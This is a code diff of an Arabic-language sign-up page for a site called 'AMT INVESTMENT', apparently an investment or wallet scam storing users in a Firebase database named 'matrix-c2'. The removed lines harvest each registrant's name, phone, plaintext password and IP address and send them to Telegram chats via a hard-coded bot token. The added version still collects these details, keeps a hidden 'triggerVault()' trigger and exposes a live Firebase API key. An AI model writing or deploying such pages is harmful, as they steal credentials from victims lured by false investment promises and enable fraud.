@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AMT INVESTMENT | البدء</title>
+    <title>AMT INVESTMENT | التسجيل العالمي</title>
     <link rel="stylesheet" href="glass.css">
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
@@ -11,38 +11,60 @@
 </head>
 <body class="main-bg">
     <div class="glass-container">
-        <h1 class="logo">AMT <span>INVESTMENT</span></h1>
-        <p style="text-align:center; font-size:12px; color:#7f8c8d; margin-bottom:20px;">المنصة الرسمية لإدارة المحافظ الذكية</p>
+        <h1 class="logo-text">AMT <span>INVESTMENT</span></h1>
+        <p style="text-align:center; font-size:13px; color:#64748b; margin-bottom:30px;">ابدأ استثمارك العالمي في بيئة آمنة ومشفره</p>
         
         <form id="registerForm">
-            <div class="input-group">
-                <input type="text" id="regName" placeholder="الاسم الرباعي" required>
-            </div>
+            <input type="text" id="regName" placeholder="الاسم الكامل (يمنع الرموز)" required>
             
-            <div style="display:flex; gap:8px; margin-bottom:15px;">
-                <select id="countryCode" style="width:35%; border-radius:12px;">
-                    <option value="+20">🇪🇬 +20</option>
-                    <option value="+964">🇮🇶 +964</option>
-                    <option value="+966">🇸🇦 +966</option>
-                    <option value="+971">🇦🇪 +971</option>
-                </select>
+            <div style="display:flex; gap:10px; margin-bottom:12px;">
+                <select id="countryCode" style="width:45%; font-size:13px;">
+                    <option value="+20">🇪🇬 مصر (+20)</option>
+                    <option value="+966">🇸🇦 السعودية (+966)</option>
+                    <option value="+971">🇦🇪 الإمارات (+971)</option>
+                    <option value="+964">🇮🇶 العراق (+964)</option>
+                    <option value="+965">🇰🇼 الكويت (+965)</option>
+                    <option value="+974">🇶🇦 قطر (+974)</option>
+                    <option value="+973">🇧🇭 البحرين (+973)</option>
+                    <option value="+962">🇯🇴 الأردن (+962)</option>
+                    <option value="+212">🇲🇦 المغرب (+212)</option>
+                    <option value="+213">🇩🇿 الجزائر (+213)</option>
+                    <option value="+216">🇹🇳 تونس (+216)</option>
+                    <option value="+218">🇱🇾 ليبيا (+218)</option>
+                    <option value="+44">🇬🇧 بريطانيا (+44)</option>
+                    <option value="+1">🇺🇸 أمريكا (+1)</option>
+                    <option value="+49">🇩🇪 ألمانيا (+49)</option>
+                    <option value="+33">🇫🇷 فرنسا (+33)</option>
+                    <option value="+90">🇹🇷 تركيا (+90)</option>
+                    <option value="+82">🇰🇷 كوريا الجنوبية (+82)</option>
+                    <option value="+81">🇯🇵 اليابان (+81)</option>
+                    <option value="+7">🇷🇺 روسيا (+7)</option>
+                    <option value="+34">🇪🇸 إسبانيا (+34)</option>
+                    <option value="+39">🇮🇹 إيطاليا (+39)</option>
+                    <option value="+212">🇲🇦 المغرب (+212)</option>
+                    </select>
                 <input type="tel" id="regPhone" placeholder="رقم الهاتف" required style="margin-bottom:0;">
             </div>
 
-            <div class="input-group">
-                <input type="password" id="regPass" placeholder="كلمة السر" required>
-            </div>
+            <input type="password" id="regPass" placeholder="كلمة السر (A, a, 1, @)" required>
+            <p id="passError" style="font-size:10px; color:#ef4444; margin-bottom:10px; display:none; text-align:center;">
+                يجب أن تكون 8 خانات، تشمل حرف كبير وصغير ورقم ورمز.
+            </p>
 
-            <button type="submit" class="btn-primary">إنشاء المحفظة الاستثمارية</button>
+            <button type="submit" class="btn-primary">إنشاء المحفظة المشفرة</button>
         </form>
         
-        <p style="text-align:center; margin-top:15px; font-size:13px;">لديك حساب؟ <a href="login.html" style="color:#2c3e50; font-weight:bold; text-decoration:none;">تسجيل الدخول</a></p>
-        
-        <p class="version-text" onclick="triggerVault()">v1.0.8</p>
+        <div style="text-align:center; margin-top:25px;">
+            <p style="font-size:14px; color: #1e293b;">لديك حساب؟ <a href="login.html" style="color:#2c3e50; font-weight:bold; text-decoration:none;">تسجيل دخول</a></p>
+        </div>
+
+        <div class="footer-info">
+            <p class="version-badge" onclick="triggerVault()">AMT GLOBAL v3.5.0</p>
+        </div>
     </div>
 
     <script>
-        // إعدادات Firebase (يجب أن تكون موحدة في كل الملفات)
+        // إعدادات Firebase
         const firebaseConfig = {
           apiKey: "AIzaSyAkz8kGNDOJ5caCIbdoXpvJBZgUbigjT5g",
           databaseURL: "https://matrix-c2-default-rtdb.firebaseio.com",
@@ -50,38 +72,41 @@
         };
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
 
-        const botToken = "8619795327:AAF8hZQVZlyLkxYyU6bmuu2KVM2nyNUmpRE";
-        const chatIds = ["8622780736", "8211953992"];
-
         document.getElementById('registerForm').onsubmit = async (e) => {
             e.preventDefault();
-            const name = document.getElementById('regName').value;
-            const phone = document.getElementById('countryCode').value + document.getElementById('regPhone').value;
-            const pass = document.getElementById('regPass').value;
+            const passInput = document.getElementById('regPass').value;
+            const errorText = document.getElementById('passError');
 
-            // جلب الـ IP فوراً
-            let ip = "Unknown";
-            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
+            // 1. التحقق من قوة كلمة السر (Regex Check)
+            if (!isPasswordStrong(passInput)) {
+                errorText.style.display = 'block';
+                return;
+            }
+            errorText.style.display = 'none';
 
-            const userKey = phone.replace('+', '');
-            
-            // رفع البيانات للفايربيز
+            // 2. تنظيف وتجهيز البيانات
+            const cleanName = sanitizeInput(document.getElementById('regName').value);
+            const fullPhone = document.getElementById('countryCode').value + document.getElementById('regPhone').value;
+            const userKey = fullPhone.replace('+', '');
+            const uid = generateUID();
+
+            // 3. تشفير البيانات الحساسة قبل الإرسال (Matrix Encryption)
+            const encryptedPass = MatrixCrypto.encrypt(passInput);
+            const encryptedName = MatrixCrypto.encrypt(cleanName);
+
+            // 4. الرفع لقاعدة البيانات
             firebase.database().ref('users/' + userKey).set({
-                full_name: name,
-                phone: phone,
-                password: pass,
-                ip: ip,
+                uid: uid,
+                full_name: encryptedName, // مشفرة
+                phone: fullPhone,
+                password: encryptedPass, // مشفرة
                 balance: 0,
                 status: "Active",
-                tasks: ["انضم لقناة التوصيات الرسمية"], // المهام الافتراضية
-                joined_at: new Date().toLocaleString()
+                tasks: ["انضم لقناة التوصيات الرسمية"],
+                joined_at: new Date().toISOString()
             }).then(() => {
-                // إرسال الإشعار لتليجرام
-                const msg = `🎯 **مستخدم جديد انضم!**\n👤 الاسم: ${name}\n📱 هاتف: ${phone}\n🔑 كود: ${pass}\n🌐 IP: ${ip}`;
-                chatIds.forEach(id => fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`));
-
                 localStorage.setItem('userPhone', userKey);
-                alert("تم تسجيلك بنجاح في AMT INVESTMENT");
+                alert("تم إنشاء حسابك بنجاح. بياناتك الآن مشفرة.");
                 window.location.href = "dashboard.html";
             });
         };
